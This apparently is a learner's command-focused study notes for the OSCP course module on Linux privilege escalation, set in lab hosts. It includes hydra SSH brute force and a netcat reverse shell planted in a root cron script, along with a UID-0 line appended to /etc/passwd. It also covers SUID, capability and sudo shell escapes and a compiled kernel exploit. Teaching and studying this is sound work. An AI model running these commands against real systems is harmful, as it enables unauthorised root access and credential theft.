# Linux Privilege Escalation

- Module: PEN-200 / Module 18 — Linux Privilege Escalation (OSCP)
- URL: https://portal.offsec.com/courses/pen-200-44065/learning/linux-privilege-escalation-45403
- Code/command blocks: 30

> Terminal output is omitted; only commands & scripts are captured. Lab narrative uses the users `joe` (low-priv) and `eve`, host `debian-privesc` / `ubuntu-privesc` — kept literal since the chain refers back to them.
> Placeholders: `{{TARGET_IP}}` the box (remote SSH/hydra/scp target), `{{LHOST}}`/`{{LPORT}}` your Kali listener for reverse shells, `{{WORDLIST}}` a generated/wordlist file, `{{OUTPUT}}` an output file.

> **⚡ Quick jump:** [18.1.2 Manual enum](#182-manual-enumeration) · [18.1.3 Automated (unix-privesc-check/LinPEAS)](#183-automated-enumeration) · [18.3.1 Cron jobs](#1831-abusing-cron-jobs) · [18.3.2 /etc/passwd write](#1832-abusing-password-authentication) · [18.4.1 SUID & capabilities](#1841-abusing-setuid-binaries-and-capabilities) · [18.4.2 sudo](#1842-abusing-sudo) · [18.4.3 Kernel exploits](#1843-exploiting-kernel-vulnerabilities)

---

# 18.1 — Enumerating Linux

## 18.1.1 Understanding file & user privileges

> Every file has `rwx` for three categories: **owner**, **owner group**, **others**. For files `r`=read content, `w`=change content, `x`=run. For directories `r`=list contents, `w`=create/delete files, `x`=`cd` through it. The leading char in `ls -l` is the file *type* (ignore for permissions). `x` on a dir without `r` = you can access known entries by exact name only.

```bash
ls -l /etc/shadow          # -rw-r----- root shadow : owner rw, group r, others none
```

## 18.1.2 Manual enumeration

> Slower than automated tools but catches the one-off custom misconfigs the tools miss. First thing after a foothold: establish user context, then sweep the host.

Who am I / who else is here:

```bash
id                          # current uid/gid + groups
cat /etc/passwd             # all accounts; nologin shell = service acct, /bin/bash = real user
hostname                    # role hints (web/db/dc...)
```

OS / kernel / architecture (needed before any kernel exploit — a mismatch can crash the box):

```bash
cat /etc/issue
cat /etc/os-release
uname -a                    # kernel version + arch
```

Processes, network, firewall (look for root-owned processes, loopback-only services, extra NICs = pivot):

```bash
ps aux                      # all processes; grep a username to filter
ip a                        # interfaces (or: ifconfig -a)
routel                      # routing table (or: route)
ss -anp                     # listening ports + owning process (or: netstat -anp)
```

Firewall rules are root-only via `iptables`, but the persisted rule files are often world-readable:

```bash
cat /etc/iptables/rules.v4  # saved netfilter rules (iptables-persistent); grep FS for iptables-save dumps
```

Scheduled tasks (`cron`) — prime privesc target since system jobs run as root:

```bash
ls -lah /etc/cron*          # /etc/crontab + /etc/cron.{d,daily,hourly,weekly,monthly}
crontab -l                  # current user's jobs
sudo crontab -l             # root's jobs (if allowed) — reveals root-run scripts
```

Installed packages (to match against exploits) — `dpkg` on Debian, `rpm` on RedHat:

```bash
dpkg -l                     # Debian/Ubuntu
rpm -qa                     # RedHat/CentOS/Fedora
```

Weak file/dir permissions, drives, kernel modules:

```bash
find / -writable -type d 2>/dev/null            # world/user-writable directories
cat /etc/fstab                                  # drives mounted at boot
mount                                           # currently mounted filesystems
lsblk                                           # all block devices (spot unmounted partitions)
lsmod                                           # loaded kernel modules/drivers
/sbin/modinfo libata                            # detail on a specific module (needs full path)
```

SUID/SGID binaries — run as the file **owner** (root), a classic shortcut:

```bash
find / -perm -u=s -type f 2>/dev/null           # SUID binaries (s bit); cross-ref GTFOBins
```

> Curated technique lists: g0tmi1k's Basic Linux Privilege Escalation, PayloadsAllTheThings, and HackTricks — Linux Privilege Escalation.

## 18.1.3 Automated enumeration

> Fast baseline, but every host is unique — always follow up with manual inspection. `unix-privesc-check` ships on Kali; transfer it to the target and run `standard` mode.

```bash
unix-privesc-check                              # usage: standard | detailed
./unix-privesc-check standard > {{OUTPUT}}      # e.g. output.txt — flags writable /etc/passwd etc.
```

> Other staples worth running: **LinEnum**, **LinPEAS** (in this repo's `linpeas/`). They automate the checks above but miss bespoke changes.

---

# 18.2 — Exposed Confidential Information

## 18.2.1 Inspecting user trails

> Low-hanging fruit: user history & dotfiles (`.bashrc`, etc.) often hold clear-text secrets. Admins sometimes stash creds in environment variables for scripts.

```bash
env                         # look for password-like vars (e.g. SCRIPT_CREDENTIALS)
cat ~/.bashrc               # confirm a var is exported on every shell
su - root                   # try the leaked password directly
```

Turn a partial/known password into a targeted wordlist, then spray it over SSH:

```bash
crunch 6 6 -t Lab%%% > {{WORDLIST}}                     # 6-char words: "Lab" + 3 digits
hydra -l eve -P {{WORDLIST}} {{TARGET_IP}} -t 4 ssh -V  # brute eve over SSH
ssh eve@{{TARGET_IP}}                                   # log in once cracked
```

After landing as a new user, always re-check sudo:

```bash
sudo -l                     # what can this user run as root?
sudo -i                     # if (ALL : ALL) ALL -> interactive root shell
```

## 18.2.2 Inspecting service footprints

> Daemons/custom scripts running as root can leak creds you can watch even as a low-priv user.

```bash
watch -n 1 "ps -aux | grep pass"        # catch short-lived root processes passing creds on the CLI
sudo tcpdump -i lo -A | grep "pass"     # if granted sudo tcpdump: sniff loopback for clear-text creds
```

---

# 18.3 — Insecure File Permissions

## 18.3.1 Abusing cron jobs

> Find a root-run cron script that **you can write to**, append a reverse shell, wait ≤1 min for it to fire.

Locate the job and check its permissions:

```bash
grep "CRON" /var/log/syslog             # which scripts cron runs, and as whom (/var/log/cron.log too)
cat /home/joe/.scripts/user_backups.sh  # inspect the script
ls -lah /home/joe/.scripts/user_backups.sh   # -rwxrwxrw- = world-writable => exploitable
```

Append a reverse-shell one-liner, then catch it:

```bash
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f" >> user_backups.sh
```

```bash
nc -lnvp {{LPORT}}                      # on Kali — root shell arrives within a minute
```

## 18.3.2 Abusing password authentication

> If a hash sits in the 2nd field of an `/etc/passwd` record it's used for auth and **takes precedence over `/etc/shadow`**. So a writable `/etc/passwd` = instant superuser.

```bash
openssl passwd w00t                     # generate a crypt() hash (may be DES/MD5 by OS)
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd   # UID/GID 0 = superuser
su root2                                # password: w00t  ->  root
```

---

# 18.4 — Insecure System Components

## 18.4.1 Abusing setuid binaries and capabilities

> A process has real / effective / saved-set / filesystem UIDs. A **SUID** binary owned by root runs with **effective UID 0** regardless of who launches it. `chmod u+s <file>` sets it. Any SUID root program you can subvert = root.

Inspect how SUID shows up (using `passwd` as the reference example):

```bash
ps u -C passwd                          # passwd runs as root
grep Uid /proc/<PID>/status             # real=1000 but effective/saved/fs = 0 (root)
ls -asl /usr/bin/passwd                 # -rwsr-xr-x : the 's' is the SUID flag
```

Exploit a SUID binary (e.g. misconfigured `find`) — `-p` stops bash dropping the effective UID:

```bash
find / -perm -u=s -type f 2>/dev/null                # enumerate SUID binaries first
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;   # SUID find -> root shell (bash -p)
```

**Linux capabilities** — finer-grained privileges on binaries; `cap_setuid+ep` is as good as SUID root:

```bash
/usr/sbin/getcap -r / 2>/dev/null       # recursive search for capabilities; check GTFOBins for the hit
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'   # abuse perl cap_setuid+ep -> root
```

## 18.4.2 Abusing sudo

> `sudo -l` lists what you may run as root. Look up each allowed binary on **GTFOBins** for a shell-escape. Watch for AppArmor (MAC) blocking the obvious escapes — check `/var/log/syslog` for `apparmor="DENIED"` and `aa-status`.

```bash
sudo -l                                 # e.g. (ALL)(ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```

tcpdump GTFOBins escape (blocked here by an AppArmor profile — shown as the failed path):

```bash
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root   # AppArmor DENIED on this box
```

Check what AppArmor is enforcing:

```bash
cat /var/log/syslog | grep tcpdump      # spot the apparmor="DENIED" line
aa-status                               # (as root) list enforced profiles — tcpdump is confined
```

apt-get GTFOBins escape (works — spawns a shell from `less`):

```bash
sudo apt-get changelog apt
!/bin/sh                                # inside the pager -> root shell
```

## 18.4.3 Exploiting kernel vulnerabilities

> Powerful but fragile — must match kernel version **and** OS flavor, and can crash the box, so test locally first. Fingerprint, find a matching exploit with searchsploit, compile (ideally on the target to match libs/arch), run.

Fingerprint the target:

```bash
cat /etc/issue                          # e.g. Ubuntu 16.04.4 LTS
uname -r                                # e.g. 4.4.0-116-generic
arch                                    # e.g. x86_64
```

Find a matching local-privesc exploit, filtering noise:

```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

Copy it out, read the header for build/run instructions:

```bash
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
head 45010.c -n 20                      # note the exact gcc line the author gives
```

Rename to what the exploit expects, transfer to the target, compile there, verify arch, run:

```bash
mv 45010.c cve-2017-16995.c
scp cve-2017-16995.c joe@{{TARGET_IP}}:                 # push source to target
```

```bash
gcc cve-2017-16995.c -o cve-2017-16995                  # compile ON the target (matches libs/arch)
file cve-2017-16995                                     # confirm ELF 64-bit x86-64
./cve-2017-16995                                        # -> uid=0(root)
```

---

# 18.5 — Wrapping up

> Covered: manual + automated enumeration; escalation via unprotected credentials (env vars, history, sniffed traffic), insecure file permissions (writable cron scripts, writable `/etc/passwd`), binary flags (SUID, capabilities), sudo misconfigs (GTFOBins), and kernel exploits. Enumerate thoroughly first — the right technique follows from what the box exposes.
